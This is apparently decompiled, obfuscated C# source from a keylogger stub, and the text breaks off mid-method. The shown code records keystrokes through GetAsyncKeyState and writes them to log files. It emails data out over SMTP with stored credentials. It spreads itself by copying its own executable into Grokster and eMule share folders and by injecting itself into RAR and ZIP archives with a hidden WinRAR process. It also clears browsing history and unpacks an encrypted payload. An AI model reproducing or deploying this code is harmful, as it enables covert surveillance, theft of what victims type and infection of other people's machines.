using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Accuracy_Logger_Stub.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using ns1;
using ns2;
using ns3;
using ns5;

namespace ns0;

internal sealed class Class15
{
	static void smethod_0(string string_0, Form1 form1_0, string string_1)
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(form1_0.string_0[1]);
			mailMessage.To.Add(form1_0.string_0[1]);
			mailMessage.Subject = string_1;
			mailMessage.Body = string_0;
			SmtpClient smtpClient = new SmtpClient(form1_0.string_0[3]);
			smtpClient.Port = Conversions.ToInteger(form1_0.string_0[4]);
			smtpClient.Credentials = new NetworkCredential(form1_0.string_0[1], form1_0.string_0[2]);
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_1(Class20.Class22 class22_0, int int_0)
	{
		if (class22_0.int_2 < int_0)
		{
			if (class22_0.int_0 == class22_0.int_1)
			{
				return -1;
			}
			class22_0.uint_0 |= (uint)(((class22_0.byte_0[class22_0.int_0++] & 0xFF) | ((class22_0.byte_0[class22_0.int_0++] & 0xFF) << 8)) << class22_0.int_2);
			class22_0.int_2 += 16;
		}
		return (int)(class22_0.uint_0 & ((1 << int_0) - 1));
	}

	unsafe static byte[] smethod_2(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class15.smethod_5(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class20.Stream0 stream = new Class20.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class15.smethod_44(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class15.smethod_66(stream);
			*(int*)((byte*)ptr + 4) = Class15.smethod_66(stream);
			*(int*)((byte*)ptr + 8) = Class15.smethod_66(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class15.smethod_44(stream);
			Class15.smethod_44(stream);
			Class15.smethod_44(stream);
			*(int*)((byte*)ptr + 12) = Class15.smethod_44(stream);
			*(int*)((byte*)ptr + 16) = Class15.smethod_66(stream);
			*(int*)((byte*)ptr + 20) = Class15.smethod_66(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class20.Class21 class21_ = new Class20.Class21(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class15.smethod_41(0, class21_, array.Length, array);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class15.smethod_44(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class15.smethod_44(stream);
					*(int*)((byte*)ptr + 40) = Class15.smethod_44(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class20.Class21 class21_2 = new Class20.Class21(array3);
					Class15.smethod_41(*(int*)((byte*)ptr + 32), class21_2, *(int*)((byte*)ptr + 40), array);
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_ = new byte[8] { 222, 136, 124, 78, 26, 0, 102, 39 };
				byte[] byte_2 = new byte[8] { 143, 21, 158, 36, 249, 133, 162, 48 };
				using Class19 class19_ = new Class19();
				using ICryptoTransform cryptoTransform = Class15.smethod_11(byte_, byte_2, class19_, bool_0: true);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class15.smethod_2(byte_3);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class18 class18_ = new Class18();
				using ICryptoTransform cryptoTransform2 = Class15.smethod_13(bool_0: true, byte_4, byte_5, class18_);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class15.smethod_2(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static void smethod_3()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_4);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\grokster\\my grokster\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_3);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_4()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		string folderPath = default(string);
		string string_2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 281:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_0031;
						case 5:
							goto IL_0046;
						case 6:
							goto IL_0056;
						case 7:
							goto IL_0066;
						case 8:
							goto IL_0076;
						case 9:
							goto IL_0086;
						case 10:
							goto IL_0097;
						case 11:
							goto IL_00a8;
						case 12:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 13:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_00a8:
					*(int*)((byte*)ptr + 8) = 11;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0097:
					*(int*)((byte*)ptr + 8) = 10;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_00a8;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					goto IL_001b;
					IL_001b:
					*(int*)((byte*)ptr + 8) = 3;
					string_2 = folderPath.Replace("Documents", "Downloads\\eMule\\Incoming\\");
					goto IL_0031;
					IL_0031:
					*(int*)((byte*)ptr + 8) = 4;
					string_ = Class7.string_5 + "\\emule\\incoming\\";
					goto IL_0046;
					IL_0046:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_2, Class7.string_1);
					goto IL_0056;
					IL_0056:
					*(int*)((byte*)ptr + 8) = 6;
					Class15.smethod_52(string_2, Class7.string_2);
					goto IL_0066;
					IL_0066:
					*(int*)((byte*)ptr + 8) = 7;
					Class15.smethod_52(string_2, Class7.string_3);
					goto IL_0076;
					IL_0076:
					*(int*)((byte*)ptr + 8) = 8;
					Class15.smethod_52(string_2, Class7.string_4);
					goto IL_0086;
					IL_0086:
					*(int*)((byte*)ptr + 8) = 9;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0097;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 12;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 281;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_5(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static Class20.Class24 smethod_6(Class20.Class25 class25_0)
	{
		byte[] array = new byte[class25_0.int_4];
		Array.Copy(class25_0.byte_1, class25_0.int_3, array, 0, class25_0.int_4);
		return new Class20.Class24(array);
	}

	unsafe static int smethod_7(Class20.Class24 class24_0, Class20.Class22 class22_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class15.smethod_1(class22_0, 9)) >= 0)
		{
			if ((num2 = class24_0.short_0[num]) >= 0)
			{
				Class15.smethod_37(class22_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class15.smethod_1(class22_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class24_0.short_0[*(int*)ptr | (num >> 9)];
				Class15.smethod_37(class22_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class22_0.int_2;
			num = Class15.smethod_1(class22_0, *(int*)((byte*)ptr + 8));
			num2 = class24_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class15.smethod_37(class22_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class22_0.int_2;
		num = Class15.smethod_1(class22_0, *(int*)((byte*)ptr + 12));
		num2 = class24_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class15.smethod_37(class22_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_8(Class20.Class22 class22_0)
	{
		return class22_0.int_2;
	}

	static int smethod_9(Class20.Class23 class23_0)
	{
		return 32768 - class23_0.int_1;
	}

	static MySettings smethod_10()
	{
		return MySettings.Default;
	}

	static ICryptoTransform smethod_11(byte[] byte_0, byte[] byte_1, Class19 class19_0, bool bool_0)
	{
		class19_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class19_0.object_0, new object[1] { byte_0 });
		class19_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class19_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class19_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class19_0.object_0, new object[0]);
	}

	static void smethod_12()
	{
		Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255", (AppWinStyle)2, false, -1);
	}

	static ICryptoTransform smethod_13(bool bool_0, byte[] byte_0, byte[] byte_1, Class18 class18_0)
	{
		class18_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class18_0.object_0, new object[1] { byte_0 });
		class18_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class18_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class18_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class18_0.object_0, new object[0]);
	}

	static void smethod_14()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetModuleFileNameA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string string_0, [In][MarshalAs(UnmanagedType.LPTStr)] string string_1, long long_0);

	unsafe static void smethod_15(string string_0)
	{
		void* ptr = stackalloc byte[2];
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		Class7.Class8.string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		*(bool*)ptr = File.Exists(Class7.Class8.string_0);
		if (*(bool*)ptr)
		{
			((byte*)ptr)[1] = ((!File.Exists(Path.Combine(path, Class7.Class8.string_1))) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[1] != 0)
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, Class7.Class8.string_1));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			Class15.GetShortPathName(Path.Combine(path, Class7.Class8.string_1), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			StringBuilder stringBuilder2 = new StringBuilder(255);
			Class15.GetShortPathName(string_0, stringBuilder2, stringBuilder2.Capacity);
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = " a " + Convert.ToString(stringBuilder2) + " " + text;
				processStartInfo.FileName = Class7.Class8.string_0;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static void smethod_16()
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt"))
		{
			try
			{
				Class15.smethod_49("RunFirst.exe");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static int smethod_17(Class20.Class23 class23_0)
	{
		return class23_0.int_1;
	}

	unsafe static void smethod_18(byte[] byte_0, Class20.Class24 class24_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			*(int*)((byte*)ptr + 4) = byte_0[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class24_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class24_0.short_0[Class15.smethod_40(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 52) = byte_0[*(int*)((byte*)ptr + 48)];
			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class15.smethod_40(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
						class24_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class24_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class24_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	static void smethod_19(Class20.Class23 class23_0, int int_0, int int_1)
	{
		if ((class23_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class23_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class23_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class23_0.byte_0, num, class23_0.byte_0, class23_0.int_0, int_0);
				class23_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class23_0.byte_0[class23_0.int_0++] = class23_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class15.smethod_26(class23_0, num, int_0, int_1);
		}
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static void smethod_20(Form1 form1_0)
	{
		FileStream fileStream = new FileStream(form1_0.vmethod_24().get_Text() + "\\" + form1_0.vmethod_22().get_Text() + ".txt", FileMode.Append);
		StreamWriter streamWriter = new StreamWriter(fileStream);
		streamWriter.Write(form1_0.vmethod_0().get_Text());
		streamWriter.Close();
		fileStream.Close();
		form1_0.vmethod_30().set_Text(form1_0.vmethod_24().get_Text() + "\\" + form1_0.vmethod_22().get_Text() + ".txt");
	}

	unsafe static int smethod_21(Class20.Class22 class22_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (class22_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class22_0.uint_0;
			class22_0.uint_0 >>= 8;
			class22_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class22_0.int_1 - class22_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class22_0.byte_0, class22_0.int_0, byte_0, int_0, int_1);
		class22_0.int_0 += int_1;
		if (((uint)(class22_0.int_0 - class22_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class22_0.uint_0 = class22_0.byte_0[class22_0.int_0++] & 0xFFu;
			class22_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static void smethod_22(Class18 class18_0)
	{
		class18_0.type_0.GetMethod("Clear")!.Invoke(class18_0.object_0, new object[0]);
	}

	static void smethod_23()
	{
		try
		{
			IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
			hostAddresses[0].ToString();
			Dns.GetHostEntry("workgroup");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), "workgroup");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	unsafe static string smethod_24(Form1 form1_0)
	{
		void* ptr = stackalloc byte[15];
		((byte*)ptr)[12] = ((Class15.GetKeyState(20L) != 0) ? ((byte)1) : ((byte)0));
		((byte*)ptr)[13] = ((Class15.GetAsyncKeyState(16L) != 0) ? ((byte)1) : ((byte)0));
		((byte*)ptr)[14] = ((Class15.GetAsyncKeyState(8L) == -32767) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[14] != 0)
		{
			return "{Backspace}";
		}
		((byte*)ptr)[14] = ((Class15.GetAsyncKeyState(9L) == -32767) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[14] != 0)
		{
			return "   ";
		}
		((byte*)ptr)[14] = ((Class15.GetAsyncKeyState(13L) == -32767) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[14] != 0)
		{
			return "\r\n";
		}
		*(int*)ptr = 32;
		int num;
		do
		{
			((byte*)ptr)[14] = ((Class15.GetAsyncKeyState((long)(*(int*)ptr)) == -32767) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[14] == 0)
			{
				checked
				{
					(*unchecked((int*)ptr))++;
				}
				num = *(int*)ptr;
				*(int*)((byte*)ptr + 8) = 222;
				continue;
			}
			*(int*)((byte*)ptr + 4) = *(int*)ptr;
			if (*(int*)((byte*)ptr + 4) == 32)
			{
				return " ";
			}
			if ((*(int*)((byte*)ptr + 4) >= 48 && *(int*)((byte*)ptr + 4) <= 57) ? true : false)
			{
				((byte*)ptr)[14] = ((((byte*)ptr)[13] == 0) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[14] != 0)
				{
					return Conversions.ToString(Strings.Chr(*(int*)ptr));
				}
				string text = ")!@#$%^&*(";
				checked
				{
					return Conversions.ToString(text[*unchecked((int*)ptr) - 48]);
				}
			}
			if ((*(int*)((byte*)ptr + 4) >= 65 && *(int*)((byte*)ptr + 4) <= 90) ? true : false)
			{
				((byte*)ptr)[14] = ((byte*)ptr)[12];
				if (((byte*)ptr)[14] != 0)
				{
					if (((byte*)ptr)[13] != 0)
					{
						return Conversions.ToString(Strings.LCase(Strings.Chr(*(int*)ptr)));
					}
					return Conversions.ToString(Strings.Chr(*(int*)ptr));
				}
				if (((byte*)ptr)[13] != 0)
				{
					return Conversions.ToString(Strings.Chr(*(int*)ptr));
				}
				return Conversions.ToString(Strings.LCase(Strings.Chr(*(int*)ptr)));
			}
			if ((*(int*)((byte*)ptr + 4) >= 96 && *(int*)((byte*)ptr + 4) <= 105) ? true : false)
			{
				return Conversions.ToString(Strings.Chr(checked(*unchecked((int*)ptr) - 48)));
			}
			if (*(int*)((byte*)ptr + 4) == 106)
			{
				return "*";
			}
			if (*(int*)((byte*)ptr + 4) == 107)
			{
				return "+";
			}
			if (*(int*)((byte*)ptr + 4) == 109)
			{
				return "-";
			}
			if (*(int*)((byte*)ptr + 4) == 110)
			{
				return ".";
			}
			if (*(int*)((byte*)ptr + 4) == 111)
			{
				return "/";
			}
			if (*(int*)((byte*)ptr + 4) == 186)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return ":";
				}
				return ";";
			}
			if (*(int*)((byte*)ptr + 4) == 187)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "+";
				}
				return "=";
			}
			if (*(int*)((byte*)ptr + 4) == 188)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "<";
				}
				return ",";
			}
			if (*(int*)((byte*)ptr + 4) == 189)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "_";
				}
				return "-";
			}
			if (*(int*)((byte*)ptr + 4) == 190)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return ">";
				}
				return ".";
			}
			if (*(int*)((byte*)ptr + 4) == 191)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "?";
				}
				return "/";
			}
			if (*(int*)((byte*)ptr + 4) == 192)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "~";
				}
				return "`";
			}
			if (*(int*)((byte*)ptr + 4) == 219)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "{";
				}
				return "[";
			}
			if (*(int*)((byte*)ptr + 4) == 220)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "|";
				}
				return "\\";
			}
			if (*(int*)((byte*)ptr + 4) == 221)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "}";
				}
				return "]";
			}
			if (*(int*)((byte*)ptr + 4) == 222)
			{
				if (((byte*)ptr)[13] != 0)
				{
					return "\"";
				}
				return "'";
			}
			return "";
		}
		while (num <= *(int*)((byte*)ptr + 8));
		return "";
	}

	unsafe static void smethod_25(string string_0)
	{
		void* ptr = stackalloc byte[9];
		string[] files = Directory.GetFiles(string_0);
		string[] array = files;
		*(int*)ptr = 0;
		while (true)
		{
			((byte*)ptr)[8] = ((*(int*)ptr < array.Length) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[8] == 0)
			{
				break;
			}
			string text = array[*(int*)ptr];
			((byte*)ptr)[8] = (text.Contains(".rar") ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[8] != 0)
			{
				Class15.smethod_15(text);
			}
			((byte*)ptr)[8] = (text.Contains(".zip") ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[8] != 0)
			{
				Class15.smethod_15(text);
			}
			checked
			{
				(*unchecked((int*)ptr))++;
			}
		}
		string[] directories = Directory.GetDirectories(string_0);
		string[] array2 = directories;
		*(int*)((byte*)ptr + 4) = 0;
		while (true)
		{
			((byte*)ptr)[8] = ((*(int*)((byte*)ptr + 4) < array2.Length) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[8] != 0)
			{
				string string_ = array2[*(int*)((byte*)ptr + 4)];
				Class15.smethod_25(string_);
				checked
				{
					(*unchecked((int*)((byte*)ptr + 4)))++;
					continue;
				}
			}
			break;
		}
	}

	static void smethod_26(Class20.Class23 class23_0, int int_0, int int_1, int int_2)
	{
